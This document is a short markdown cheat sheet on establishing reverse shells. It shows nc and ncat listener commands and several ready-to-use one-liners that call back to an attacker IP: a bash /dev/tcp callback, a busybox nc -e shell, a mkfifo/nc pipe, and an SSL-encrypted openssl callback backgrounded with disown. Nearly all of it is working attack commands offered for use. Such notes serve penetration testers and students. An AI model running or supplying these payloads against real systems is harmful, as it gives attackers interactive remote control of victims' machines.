There are a handful of killer resources for establishing shells.
Go-to-resource for simple reverse shells: https://revshells.com

## Attacker (Listener)
---
``nc`` is generally used as the listener for a reverse shell, however ``ncat`` is Nmap's fork of ``nc`` which provides optional SSL support for encrypted communications.

Start up a standard reverse shell listener with the following command:

```shell
nc -lvnp <port>
```

Start up a reverse shell listener with SSL support:

```shell
ncat --ssl -lvnp <port>
```

## Standard Reverse Shell
---

On Linux, the sheer quantity of dependencies and programs that may or may not be installed makes it difficult to recommend a commonly used command, but I will provide a couple common ones below.

```shell
# bash -i Callback
sh -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Busybox nc -e
busybox nc <attacker_ip> <port> -e sh

# mkfifo / nc Callback
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> >/tmp/f
```

## SSL Encrypted Reverse Shell
---

For SSL encrypted reverse shells, the victim should either have ``ncat`` installed or ``openssl``

```shell
# mkfifo / openssl Encrypted Callback
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | openssl s_client -connect <attacker_ip>:<port> 2>&1 > /tmp/f & disown
```
